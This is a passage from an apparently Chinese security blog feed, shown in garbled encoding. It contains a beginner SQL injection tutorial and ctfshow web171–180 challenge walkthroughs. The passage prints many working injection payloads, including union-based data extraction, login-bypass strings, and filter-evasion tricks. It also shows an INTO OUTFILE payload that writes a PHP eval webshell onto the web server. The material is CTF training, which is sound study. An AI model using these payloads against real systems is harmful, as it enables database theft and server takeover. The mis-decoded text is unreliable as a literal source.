type:a<br>ä½¿ç”¨æ¡ä»¶:å¿…é¡»å­˜åœ¨domain:æˆ–è€…host:æ¡ä»¶,æ‰å¯ä»¥ä½¿ç”¨type:æŸ¥è¯¢è¯­æ³•</p><p>æŒ‰IPé™åˆ¶</p><p>æŸ¥è¯¢è¯­æ³•: ip:<br>æŸ¥è¯¢æŒ‡å®šIP: ip:8.8.8.8, è¯¥æŸ¥è¯¢ä¸ç›´æ¥è¾“å…¥8.8.8.8è¿›è¡ŒæŸ¥è¯¢ç­‰æ•ˆ<br>æŸ¥è¯¢æŒ‡å®šIPèŒƒå›´: ip:8.8.8.8-8.8.255.255<br>CIDR: ip:8.8.0.0&#x2F;24<br>IPæœ€å¤§èŒƒå›´é™åˆ¶65536ä¸ª</p><p>æ¡ä»¶ç»„åˆæŸ¥è¯¢çš„ä¾‹å­</p><p>æŸ¥è¯¢google.comçš„æ‰€æœ‰Aè®°å½•: google.com type:a</p><h6 id="Apollo"><a href="#Apollo" class="headerlink" title="Apollo"></a><a href="https://github.com/b0bac/ApolloScanner">Apollo</a></h6><h6 id="EHole"><a href="#EHole" class="headerlink" title="EHole"></a><a href="https://github.com/EdgeSecurityTeam/EHole">EHole</a></h6><h6 id="ShuiZe"><a href="#ShuiZe" class="headerlink" title="ShuiZe"></a><a href="https://github.com/0x727/ShuiZe_0x727">ShuiZe</a></h6><h6 id="Kunyu"><a href="#Kunyu" class="headerlink" title="Kunyu"></a><a href="https://github.com/knownsec/Kunyu">Kunyu</a></h6><h6 id="Saucerframe"><a href="#Saucerframe" class="headerlink" title="Saucerframe"></a><a href="https://github.com/saucer-man/saucerframe">Saucerframe</a></h6>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-sqli</title>
      <link href="/2024/07/05/web%E5%85%A5%E9%97%A8-sqli/"/>
      <url>/2024/07/05/web%E5%85%A5%E9%97%A8-sqli/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><h4 id="SQLæ³¨å…¥åŸç†"><a href="#SQLæ³¨å…¥åŸç†" class="headerlink" title="SQLæ³¨å…¥åŸç†"></a>SQLæ³¨å…¥åŸç†</h4><h5 id="1-SQLæ³¨å…¥æ¦‚å¿µåŠäº§ç”ŸåŸå› ï¼š"><a href="#1-SQLæ³¨å…¥æ¦‚å¿µåŠäº§ç”ŸåŸå› ï¼š" class="headerlink" title="1.SQLæ³¨å…¥æ¦‚å¿µåŠäº§ç”ŸåŸå› ï¼š"></a>1.SQLæ³¨å…¥æ¦‚å¿µåŠäº§ç”ŸåŸå› ï¼š</h5><p>å½“webåº”ç”¨å‘åå°æ•°æ®åº“ä¼ é€’SQLè¯­å¥è¿›è¡Œæ•°æ®åº“æ“ä½œæ—¶ï¼Œå¦‚æœå¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤å¤„ç†ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æ„é€ ç‰¹æ®Š</p><p>çš„SQLè¯­å¥ï¼Œç›´æ¥è¾“å…¥æ•°æ®åº“å¼•æ“æ‰§è¡Œï¼Œè·å–æˆ–ä¿®æ”¹æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚</p><h5 id="2-SQLæ³¨å…¥çš„æœ¬è´¨ï¼š"><a href="#2-SQLæ³¨å…¥çš„æœ¬è´¨ï¼š" class="headerlink" title="2.SQLæ³¨å…¥çš„æœ¬è´¨ï¼š"></a>2.SQLæ³¨å…¥çš„æœ¬è´¨ï¼š</h5><p>æŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®å½“ä½œä»£ç æ¥æ‰§è¡Œï¼Œè¿èƒŒäº†â€œæ•°æ®ä¸ä»£ç åˆ†ç¦»â€çš„åŸåˆ™</p><h5 id="3-SQLæ³¨å…¥çš„ä¸¤ä¸ªå…³é”®ç‚¹ï¼š"><a href="#3-SQLæ³¨å…¥çš„ä¸¤ä¸ªå…³é”®ç‚¹ï¼š" class="headerlink" title="3.SQLæ³¨å…¥çš„ä¸¤ä¸ªå…³é”®ç‚¹ï¼š"></a>3.SQLæ³¨å…¥çš„ä¸¤ä¸ªå…³é”®ç‚¹ï¼š</h5><p>1.ç”¨æˆ·èƒ½æ§åˆ¶è¾“å…¥çš„å†…å®¹ï¼› </p><p>2.webåº”ç”¨æŠŠç”¨æˆ·è¾“å…¥çš„å†…å®¹å¸¦å…¥åˆ°æ•°æ®åº“æ‰§è¡Œï¼›</p><h5 id="SQLæ³¨å…¥åŸºç¡€å±å®³ï¼š"><a href="#SQLæ³¨å…¥åŸºç¡€å±å®³ï¼š" class="headerlink" title="SQLæ³¨å…¥åŸºç¡€å±å®³ï¼š"></a>SQLæ³¨å…¥åŸºç¡€å±å®³ï¼š</h5><p>1.ç›—å–ç½‘ç«™çš„æ•æ„Ÿä¿¡æ¯;</p><p>2.ç»•è¿‡ç½‘ç«™åå°è®¤è¯ åå°ç™»å½•è¯­å¥ï¼š </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM admin WHERE Username&#x3D;â€˜userâ€™ and Password&#x3D;â€˜passâ€™ ä¸‡èƒ½å¯†ç ï¼šâ€˜or â€™1â€˜ &#x3D; â€™1â€˜ # ;</code></pre><p>3.å€ŸåŠ©SQLæ³¨å…¥æ¼æ´ææƒè·å–ç³»ç»Ÿæƒé™;</p><p>4.è¯»å–æ–‡ä»¶ä¿¡æ¯ã€‚</p><h4 id="MYSQLæ•°æ®åº“æ³¨å…¥-å¸¸ç”¨å‡½æ•°ï¼š"><a href="#MYSQLæ•°æ®åº“æ³¨å…¥-å¸¸ç”¨å‡½æ•°ï¼š" class="headerlink" title="MYSQLæ•°æ®åº“æ³¨å…¥-å¸¸ç”¨å‡½æ•°ï¼š"></a>MYSQLæ•°æ®åº“æ³¨å…¥-å¸¸ç”¨å‡½æ•°ï¼š</h4><p>ï¼ˆ1ï¼‰user() è¿”å›å½“å‰ä½¿ç”¨æ•°æ®åº“çš„ç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯ç½‘ç«™é…ç½®æ–‡ä»¶ä¸­è¿æ¥æ•°æ®åº“çš„è´¦å· </p><p>ï¼ˆ2ï¼‰version() è¿”å›å½“å‰æ•°æ®åº“çš„ç‰ˆæœ¬ </p><p>ï¼ˆ3ï¼‰database() è¿”å›å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ï¼Œåªæœ‰åœ¨useå‘½ä»¤é€‰æ‹©ä¸€ä¸ªæ•°æ®åº“ä¹‹åï¼Œæ‰èƒ½æŸ¥åˆ° </p><p>ï¼ˆ4ï¼‰group_concat() æŠŠæ•°æ®åº“ä¸­çš„æŸåˆ—æ•°æ®æˆ–æŸå‡ åˆ—æ•°æ®åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸² </p><p>ï¼ˆ5ï¼‰@@datadir æ•°æ®åº“è·¯å¾„ </p><p>ï¼ˆ6ï¼‰@@version_compile_os æ“ä½œç³»ç»Ÿç‰ˆæœ¬</p><h4 id="SQLï¼ˆè”åˆï¼‰æ³¨å…¥æµç¨‹ï¼š"><a href="#SQLï¼ˆè”åˆï¼‰æ³¨å…¥æµç¨‹ï¼š" class="headerlink" title="SQLï¼ˆè”åˆï¼‰æ³¨å…¥æµç¨‹ï¼š"></a>SQLï¼ˆè”åˆï¼‰æ³¨å…¥æµç¨‹ï¼š</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1 and 1&#x3D;1</code></pre><p>1ã€åˆ¤æ–­æœ‰æ— é—­åˆ </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">and 1&#x3D;1 and 1&#x3D;2 &#x2F;&#x2F;ç»“æœå’Œç¬¬ä¸€ä¸ªä¸€æ ·è¯´æ˜éœ€è¦é—­åˆï¼Œåä¹‹æ— é—­åˆ æœ‰é—­åˆåˆ™éœ€è¦ç”¨åˆ° --+é—­åˆ</code></pre><p>2ã€çŒœè§£å­—æ®µ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">order by 10 &#x2F;&#x2F;é‡‡ç”¨äºŒåˆ†æ³• </code></pre><p>3ã€åˆ¤æ–­æ•°æ®å›æ˜¾ä½ç½® </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1 union select 1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5.... &#x2F;&#x2F;å‚æ•°ç­‰å·åé¢åŠ -è¡¨ç¤ºä¸æ˜¾ç¤ºå½“å‰æ•°æ® </code></pre><p>4ã€è·å–å½“å‰æ•°æ®åº“åã€ç”¨æˆ·ã€ç‰ˆæœ¬ union select version(),database()ï¼Œuser()ï¼Œ4â€¦â€¦ 4ã€è·å–å…¨éƒ¨æ•°æ®åº“å</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(schema_name)from information_schema.schemata)</code></pre><p>5ã€è·å–è¡¨å</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;åº“å&#39;</code></pre><p>6ã€è·å–å­—æ®µå</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;è¡¨å&#39;</code></pre><p>7ã€è·å–æ•°æ®</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(å­—æ®µ1ï¼Œå­—æ®µ2)from åº“å.è¡¨å</code></pre><p>å‡½æ•°åç§°ï¼š å‡½æ•°åŠŸèƒ½ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">æŸ¥ åº“ï¼š select schema_name from information_schema.schemaæŸ¥ è¡¨ï¼š select table_name from information_schema.tables where table_schema&#x3D;åº“åæŸ¥ åˆ—ï¼š select column_name from information_schema.columns where table_name&#x3D;è¡¨åæŸ¥æ•°æ®ï¼š select åˆ—å from åº“å.è¡¨å</code></pre><blockquote><p><a href="https://blog.csdn.net/fly_enum/article/details/135307756">SQLæ³¨å…¥åŸç†åŠæ€è·¯ç»•è¿‡</a></p></blockquote><p>ä¸‡èƒ½å¯†ç ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; or 1&#x3D;1--+</code></pre><h4 id="mysqlæ“ä½œç¬¦ä¼˜å…ˆçº§ï¼šï¼ˆæ•°å­—è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼‰"><a href="#mysqlæ“ä½œç¬¦ä¼˜å…ˆçº§ï¼šï¼ˆæ•°å­—è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼‰" class="headerlink" title="mysqlæ“ä½œç¬¦ä¼˜å…ˆçº§ï¼šï¼ˆæ•°å­—è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼‰"></a>mysqlæ“ä½œç¬¦ä¼˜å…ˆçº§ï¼šï¼ˆæ•°å­—è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼‰</h4><p>ä¼˜å…ˆçº§è¿ç®—ç¬¦<br>1:&#x3D;<br>2|| , OR , XOR<br>3&amp;&amp; , AND<br>4NOT<br>5BETWEEN, CASE, WHEN, THEN, ELSE<br>6&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN<br>7|<br>8&amp;<br>9&lt;&lt;, &gt;&gt;<br>10-, +<br>11*, &#x2F;, DIV, %, MOD<br>12^<br>13- (ä¸€å…ƒå‡å·), ~ (ä¸€å…ƒæ¯”ç‰¹åè½¬)<br>14!<br>15BINARY, COLLATE</p><h4 id="æ€»ç»“â€“æ™®é€šSQLæ³¨å…¥å¿…å¤‡æ¡ä»¶ï¼š"><a href="#æ€»ç»“â€“æ™®é€šSQLæ³¨å…¥å¿…å¤‡æ¡ä»¶ï¼š" class="headerlink" title="æ€»ç»“â€“æ™®é€šSQLæ³¨å…¥å¿…å¤‡æ¡ä»¶ï¼š"></a>æ€»ç»“â€“æ™®é€šSQLæ³¨å…¥å¿…å¤‡æ¡ä»¶ï¼š</h4><p>1ã€ç•Œé¢èƒ½å¤Ÿå›æ˜¾æ•°æ®åº“æŸ¥è¯¢åˆ°çš„æ•°æ®ï¼ˆå¿…è¦æ¡ä»¶ï¼‰ï¼›</p><p>2ã€ç•Œé¢å›æ˜¾å†…å®¹è‡³å°‘èƒ½å¤Ÿæ˜¾ç¤ºæ•°æ®åº“ä¸­çš„æŸåˆ—æ•°æ®ï¼ˆå¿…è¦æ¡ä»¶ï¼‰ï¼›</p><p>3ã€éƒ¨åˆ†èƒ½å¤Ÿç›´æ¥æä¾›æ•°æ®åº“æŠ¥é”™å†…å®¹çš„å›æ˜¾ï¼›</p><h3 id="web171-253"><a href="#web171-253" class="headerlink" title="web171-253"></a>web171-253</h3><h4 id="web171-å•å¼•å·é—­åˆ"><a href="#web171-å•å¼•å·é—­åˆ" class="headerlink" title="web171(å•å¼•å·é—­åˆ)"></a>web171(å•å¼•å·é—­åˆ)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre><p>æ ¹æ®æµç¨‹æ‹¿åˆ°åº“ è¡¨ åˆ—åï¼Œæœ€åæ‹¿åˆ°flag</p><p>ç¬¬ä¸€é¢˜æ‰€ä»¥æµç¨‹è¯¦ç»†ä¸€ç‚¹</p><p>é¦–å…ˆå°è¯•1â€™â€“+ï¼Œå‘ç°æœ‰è¿”å›å€¼ï¼›è¯´æ˜ç›´æ¥é—­åˆæ­£ç¡®ï¼›</p><p>æ¥ç€æ‰¾ç”¨æ¥è¾“å‡ºçš„åˆ—ï¼š<code>1&#39; order by 3--+</code>ï¼Œå‘ç°ä¸€å…±æœ‰3è¡Œ(å°±1,2,3,4,5æ…¢æ…¢è¯•å‡ºæ¥)</p><p>æŸ¥çœ‹æ•°æ®åº“ï¼š<code>1&#39; union select 1,2,database()--+</code>å¾—åˆ°æ•°æ®åº“åä¸º<code>ctfshow_web</code></p><p>çˆ†ç ´è¡¨åï¼š<code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schecma=database()--+</code>å¾—åˆ°è¡¨åï¼š<code>ctfshow_user</code></p><p>çˆ†ç ´åˆ—åï¼š<code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code>ï¼Œå¾—åˆ°åˆ—åï¼š<code>id,username,password</code></p><p>çˆ†ç ´ä¿¡æ¯ï¼š<code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code>ï¼Œæ‹¿åˆ°flagã€‚</p><p>æ•´ç†ä¸€ä¸‹ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">çˆ†å‡ºæœ‰å“ªäº›ä½ç½®å¯ä»¥è¿›è¡Œè¾“å‡ºæ•°æ®1&#39; order by 3--+æŸ¥çœ‹æ•°æ®åº“åå­—1&#39; union select 1,2,database()--+çˆ†ç ´è¡¨åï¼š-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+çˆ†ç ´åˆ—åï¼š1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;--+çˆ†ç ´æ•°æ®ï¼š1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code></pre><p>æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œè¿™é‡Œç”¨çš„æ˜¯1è€Œä¸æ˜¯-1ï¼Œå±…ç„¶èƒ½å¤Ÿçˆ†å‡ºä¿¡æ¯ã€‚å¯èƒ½æ˜¯è¿™é‡Œæ²¡æœ‰é™å®šè¾“å‡ºæ•°æ®çš„é‡ï¼Œæ‰€ä»¥èƒ½å¤Ÿç”¨1ï¼Œè€Œä¸æ˜¯ç”¨-1ã€‚</p><h4 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h4><p>è·Ÿä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œåªä¸è¿‡è¿™é‡ŒæŠŠflagæ¢åˆ°å¦ä¸€ä¸ªè¡¨<code>ctfshow_user2</code>é‡Œäº†ï¼Œè€Œä¸”å­—æ®µæ•°æ”¹ä¸º2äº†</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">çˆ†ç ´è¡¨å-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+çˆ†ç ´åˆ—å-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user2&#39;--+çˆ†ç ´flag-1&#39; union select 1,2,group_concat(password) FROM ctfshow_user2 where username&#x3D;&#39;flag&#39;--+</code></pre><h4 id="web173-å›æ˜¾æ£€æµ‹"><a href="#web173-å›æ˜¾æ£€æµ‹" class="headerlink" title="web173(å›æ˜¾æ£€æµ‹)"></a>web173(å›æ˜¾æ£€æµ‹)</h4><p>è¿”å›é€»è¾‘å¤šäº†é™åˆ¶ï¼Œå›æ˜¾ä¸èƒ½æœ‰flagï¼Œä½†æ˜¯ç›´æ¥æŸ¥flagå›æ˜¾æ˜¯ctfshow</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'æŸ¥è¯¢æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select 1,2,password from ctfshow_user3 where username &#x3D; &#39;flag&#39; --+1&#39; union select 1,2,group_concat(&#39;+&#39;,password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+</code></pre><p>æˆ–è€…ä½¿ç”¨å…¶ä»–ç»•è¿‡å§¿åŠ¿  <strong>ç¼–ç ç»•è¿‡,base64ï¼Œhex</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,2,to_base64(password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+-1&#39; union select 1,to_base64(username),hex(password) from ctfshow_user3 --+</code></pre><h4 id="web174-replace"><a href="#web174-replace" class="headerlink" title="web174(replace)"></a>web174(replace)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|[0-9]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'æŸ¥è¯¢æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   </code></pre><p>é™åˆ¶äº†æ•°å­—å’Œ<code>flag</code></p><p>æ›¿æ¢ï¼šå°†æ•°æ®to_base64åŠ å¯†ï¼Œç„¶åå°†é‡Œé¢æ‰€æœ‰çš„æ•°å­—ç”¨replace()æ›¿æ¢</p><p>æ›¿æ¢æ–¹å¼ï¼š<code>1 @A</code>,<code>2 @B</code> <code>3 @C</code>ç­‰ç­‰</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;) from ctfshow_user4 where username &#x3D; &#39;flag&#39; --+</code></pre><p>ç„¶åä½¿ç”¨è„šæœ¬è§£å¯†å¾—åˆ°flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64 flag64 <span class="token operator">=</span> <span class="token string">" "</span> flag <span class="token operator">=</span> flag64<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@A"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@B"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@C"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@D"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@E"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@F"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@G"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@H"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@I"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@J"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web175-into-outfile"><a href="#web175-into-outfile" class="headerlink" title="web175(into outfile)"></a>web175(into outfile)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'æŸ¥è¯¢æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      </code></pre><p>è¿‡æ»¤ASCII0-127çš„å­—ç¬¦</p><p>1.å°†flagæŸ¥è¯¢ç»“æœä¼ å…¥1.txtï¼Œè®¿é—®url&#x2F;1.txtæ–‡ä»¶å¾—flag</p><p>æŸ¥è¯¢è¯­å¥ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,password from ctfshow_user5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt&#39;--</code></pre><p>2.å°†ä¸€å¥è¯æœ¨é©¬ä¼ å…¥1.phpï¼Œä½¿ç”¨èšå‰‘é“¾æ¥åï¼Œè®¿é—®æ•°æ®åº“ï¼ŒæŸ¥è¯¢flag</p><p>æŸ¥è¯¢è¯­å¥ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre><p>burp-decoderâ€”&gt;base64åŠ å¯†ä¸€å¥è¯æœ¨é©¬ï¼Œç”¨urlåŠ å¯†è¡¨ç¤º</p><p>payload:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre><h4 id="web176-å¤§å°å†™ç»•è¿‡"><a href="#web176-å¤§å°å†™ç»•è¿‡" class="headerlink" title="web176(å¤§å°å†™ç»•è¿‡)"></a>web176(å¤§å°å†™ç»•è¿‡)</h4><p>banäº†selectï¼Œä½¿ç”¨å¤§å°å†™ç»•è¿‡</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union seLect 1,2,password from ctfshow_user--+</code></pre><h4 id="web177-ç»•è¿‡ç©ºæ ¼"><a href="#web177-ç»•è¿‡ç©ºæ ¼" class="headerlink" title="web177(&#x2F;**&#x2F;ç»•è¿‡ç©ºæ ¼)"></a>web177(&#x2F;**&#x2F;ç»•è¿‡ç©ºæ ¼)</h4><p>æŠŠç©ºæ ¼ç»™è¿‡æ»¤æ‰äº†ï¼Œå°±ç›¸å½“äºæŠŠæ³¨é‡Šç¬¦â€“ ç»™è¿‡æ»¤æ‰äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨&#x2F;**&#x2F;æˆ–è€…æ˜¯%0aï¼ˆå›è½¦ï¼‰æ¥ç»•è¿‡ç©ºæ ¼çš„è¿‡æ»¤ï¼Œ%23ï¼ˆ#ï¼‰æ¥ç»•è¿‡æ³¨é‡Šç¬¦çš„è¿‡æ»¤</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user&#x2F;**&#x2F;where&#x2F;**&#x2F;username&#x3D;&#39;flag&#39;%23</code></pre><h4 id="web178-090a0b0c0dç»•ç©ºæ ¼"><a href="#web178-090a0b0c0dç»•ç©ºæ ¼" class="headerlink" title="web178(%090a0b0c0dç»•ç©ºæ ¼*)"></a>web178(%090a0b0c0dç»•ç©ºæ ¼*)</h4><p>å› ä¸ºå·²ç»è¿‡æ»¤äº†<code>*</code>ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨å…¶å®ƒå­—ç¬¦æ¥ç»•è¿‡ç©ºæ ¼ï¼Œå¯ä»¥é€‰æ‹©</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">%</span><span class="token number">09</span> tab<span class="token operator">%</span><span class="token number">0</span>a<span class="token operator">%</span><span class="token number">0</span>b<span class="token operator">%</span><span class="token number">0</span>c<span class="token operator">%</span><span class="token number">0</span>d </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;union%09select%0a1,2,password%0bfrom%0cctfshow_user%23</code></pre><p>ä¸‡èƒ½å¯†ç </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;or%0a1&#x3D;1%231â€™or&#39;1&#39;&#x3D;&#39;1&#39;%23</code></pre><h4 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h4><p>æŠŠ<code>%09 %0a %0b %0d</code>è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨<code>%0c</code></p><p>æŠŠä¸Šé¢çš„é‚£ä¸ªå…¨æ¢æˆ<code>%0c</code></p><h4 id="web180-é—­åˆç»•è¿‡-23"><a href="#web180-é—­åˆç»•è¿‡-23" class="headerlink" title="web180(é—­åˆç»•è¿‡%23)"></a>web180(é—­åˆç»•è¿‡%23)</h4><p>è¿‡æ»¤äº†ç©ºæ ¼å’Œ%23 ï¼Œç©ºæ ¼å¯ç”¨<code>%0c</code>ï¼Œ%23ç”¨<code>or&#39;1&#39;=&#39;&#39;</code></p><pre class="language-mysql" data-language="mysql"><code 